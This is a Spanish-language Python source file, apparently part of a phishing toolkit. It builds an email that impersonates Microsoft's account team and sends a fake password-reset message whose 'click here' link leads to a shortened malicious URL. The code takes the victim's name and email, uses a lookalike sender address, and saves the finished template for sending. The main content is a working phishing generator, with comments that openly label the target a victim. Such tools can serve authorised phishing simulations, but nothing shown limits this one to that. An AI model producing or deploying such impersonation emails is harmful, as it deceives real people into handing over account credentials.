import time
import os
import sys
import smtplib
import random
from helper.helper import get_input_es,saveTemplateGenerated,urlShorter

def onedrive_es():
    
    #Información de la victima
    userName,url,userEmail,currentDate=get_input_es()
    
    randomCode=random.randint(100000,999999)
    
    senderEmail= "notificaciones@movicoders.link"
    
    ##Recopilación datos
    print("\nGenerando suplantanción OneDrive...")
    print("\nLos datos de la victima usados para este ataque:\n[Usuario]:"+userName+"\n[Email]:"+userEmail)
    urlShort=urlShorter(url+userName)
    print("\n[Url Maliciosa]:"+url+userName+"\n[Url Acortada]:"+urlShort)
    
    
    ##HTML que se enviara a la victima
    oneDriveHtml=("""
<div class="maincontent">
  <table
    width="100%"
    cellpadding="0"
    cellspacing="0"
    border="0"
    class="message"
  >
    <tbody>
      <tr>
        <td>
          <font size="-1"
            ><b>Equipo de cuentas Microsoft </b
            >&lt;{}&gt;</font
          >
        </td>
        <td align="right"><font size="-1">6 de mayo de 2024, 8:55</font></td>
      </tr>
      <tr>
        <td colspan="2" style="padding-bottom: 4px">
          <font size="-1" class="recipient"
            ><div>Para: {}</div></font
          >
        </td>
      </tr>
      <hr />
      <tr>
        <td colspan="2">
          <table width="100%" cellpadding="12" cellspacing="0" border="0">
            <tbody>
              <tr>
                <td>
                  <div style="overflow: hidden">
                    <font size="-1">
                      <u></u>
                      <div>
                        <table dir="ltr">
                          <tbody>
                            <tr>
                              <td
                                id="m_7236929832340295984i1"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI Semibold',
                                    'Segoe UI Bold', 'Segoe UI',
                                    'Helvetica Neue Medium', Arial, sans-serif;
                                  font-size: 17px;
                                  color: #707070;
                                "
                              >
                                Cuenta Microsoft
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i2"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI Light', 'Segoe UI',
                                    'Helvetica Neue Medium', Arial, sans-serif;
                                  font-size: 41px;
                                  color: #2672ec;
                                "
                              >
                                Código para restablecer contraseña
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i3"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Usa este código para restablecer la contraseña
                                de la cuenta Microsoft
                                <a
                                  dir="ltr"
                                  id="m_7236929832340295984iAccount"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="microsoft.com"
                                  target="_blank"
                                  >{}</a
                                >.
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i4"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Este es tu código:
                                <span
                                  style="
                                    font-family: 'Segoe UI Bold',
                                      'Segoe UI Semibold', 'Segoe UI',
                                      'Helvetica Neue Medium', Arial, sans-serif;
                                    font-size: 14px;
                                    font-weight: bold;
                                    color: #2a2a2a;
                                  "
                                  >{}</span
                                >
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i5"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Si no reconoces la cuenta de Microsoft
                                <a
                                  dir="ltr"
                                  id="m_7236929832340295984iAccount"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="microsoft.com"
                                  target="_blank"
                                  >{}</a
                                >, puedes
                                <a
                                  id="m_7236929832340295984iLink2"
                                  class="m_7236929832340295984link"
                                  style="color: #2672ec; text-decoration: none"
                                  href="{}"
                                  target="_blank"
                                  data-saferedirecturl="https://www.google.com/url?hl=es"
                                  >hacer clic aquí</a
                                >
                                para quitar tu dirección de correo electrónico
                                de ella.
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i6"
                                style="
                                  padding: 0;
                                  padding-top: 25px;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                Gracias,
                              </td>
                            </tr>
                            <tr>
                              <td
                                id="m_7236929832340295984i7"
                                style="
                                  padding: 0;
                                  font-family: 'Segoe UI', Tahoma, Verdana,
                                    Arial, sans-serif;
                                  font-size: 14px;
                                  color: #2a2a2a;
                                "
                              >
                                El equipo de cuentas Microsoft
                              </td>
                            </tr>
                          </tbody>
                        </table>
                        <div
                          lang="es"
                          style="margin-top: 20px; margin-bottom: 10px"
                        >
                          <a
                            class="m_7236929832340295984link"
                            href="https://go.microsoft.com/fwlink/?LinkId=521839"
                            target="_blank"
                            data-saferedirecturl="https://www.google.com/url?hl=es&amp;q=https://go.microsoft.com/fwlink/?LinkId%3D521839&amp;source=gmail&amp;ust=1715064983183000&amp;usg=AOvVaw23cXYFUFRXvAeeePxqwZU8"
                            >Declaración de privacidad</a
                          >
                          <div style="margin-top: 10px">
                            Microsoft Corporation, One
                            <a
                              href="https://www.google.com/maps/search/Microsoft+Way,+Redmond,+WA+98052?entry=gmail&amp;source=g"
                              >Microsoft Way, Redmond, WA 98052</a
                            >
                          </div>
                        </div>
                      </div>
                    </font>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </td>
      </tr>
    </tbody>
  </table>
</div>

                   """.format(senderEmail,userEmail,userEmail,randomCode,userEmail,urlShort))
    saveTemplateGenerated(userName,"OneDrive",oneDriveHtml,"Recupera tu cuenta Office",senderEmail,userEmail)